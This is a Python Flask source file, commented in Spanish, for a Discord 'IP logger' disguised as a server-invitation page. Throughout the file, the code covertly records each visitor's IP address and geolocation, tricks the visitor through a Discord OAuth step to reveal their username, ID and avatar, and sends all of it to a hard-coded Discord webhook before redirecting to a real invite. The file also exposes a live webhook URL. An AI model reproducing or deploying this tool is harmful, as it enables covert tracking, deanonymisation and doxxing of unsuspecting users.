import os
from flask import Flask, render_template, request, redirect
import requests
from datetime import datetime

# Rutas Vercel
current_dir = os.path.dirname(os.path.abspath(__file__))
template_dir = os.path.join(current_dir, '..', 'templates')
app = Flask(__name__, template_folder=template_dir)

# --- RELLENA ESTO ---
CLIENT_ID     = "TU_CLIENT_ID"
CLIENT_SECRET = "TU_CLIENT_SECRET"
REDIRECT_URI  = "https://tu-proyecto.vercel.app/callback" 
# --------------------

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1456993989306749133/2JG3BvXA__irPAOcgx-R-lTPC7n7ScgWSgUl0jMmnR-staCUFK0b0upG2LwDHfck1ean"
AVATAR_URL = "https://i.pinimg.com/736x/10/e3/f5/10e3f51d11ef13d5c88cb329211146ba.jpg"

def get_ip():
    ip = request.headers.get('x-forwarded-for', request.remote_addr)
    return ip.split(',')[0].strip() if ',' in ip else ip

@app.route('/')
def index():
    user_agent = request.headers.get('user-agent', 'Desconocido')
    if 'vercel' in user_agent.lower(): return render_template('index.html')

    # --- PASO 1: CAPTURA IP AUTOMÁTICA ---
    ip = get_ip()
    try:
        geo = requests.get(f"https://ipapi.co/{ip}/json/", headers={'User-Agent': 'Mozilla/5.0'}, timeout=5).json()
    except:
        geo = {"ip": ip}

    payload_ip = {
        "username": "1* Logger",
        "embeds": [{
            "title": "👁️ Nuevo Acceso (IP)",
            "color": 0x5865F2,
            "fields": [
                {"name": "🌐 IP", "value": f"`{ip}`", "inline": True},
                {"name": "📍 Ubicación", "value": f"{geo.get('city')}, {geo.get('country_name')}", "inline": True}
            ],
            "footer": {"text": "al3xg0nzalezzz"}
        }]
    }
    requests.post(DISCORD_WEBHOOK_URL, json=payload_ip)

    # Link que llevará al botón de "Aceptar Invitación"
    auth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify"
    return render_template('index.html', auth_url=auth_url)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code: return redirect("https://discord.gg/nUy6Vjr9YU")

    # Intercambiar código por Token
    data = {'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET, 'grant_type': 'authorization_code', 'code': code, 'redirect_uri': REDIRECT_URI}
    r_token = requests.post("https://discord.com/api/v10/oauth2/token", data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
    token = r_token.json().get('access_token')

    # --- PASO 2: CAPTURA USERNAME E ID ---
    user = requests.get("https://discord.com/api/v10/users/@me", headers={'Authorization': f'Bearer {token}'}).json()
    ip = get_ip()

    payload_user = {
        "username": "1* Logger - IDENTIDAD",
        "embeds": [{
            "title": "🎯 ¡USUARIO IDENTIFICADO!",
            "color": 0xFF0000,
            "thumbnail": {"url": f"https://cdn.discordapp.com/avatars/{user['id']}/{user['avatar']}.png" if user.get('avatar') else AVATAR_URL},
            "fields": [
                {"name": "👤 Discord", "value": f"**{user['username']}**", "inline": True},
                {"name": "🆔 ID", "value": f"`{user['id']}`", "inline": True},
                {"name": "🌐 IP Vinculada", "value": f"`{ip}`", "inline": False}
            ]
        }]
    }
    requests.post(DISCORD_WEBHOOK_URL, json=payload_user)

    # Al final lo mandamos a tu invitación real
    return redirect("https://discord.gg/nUy6Vjr9YU")
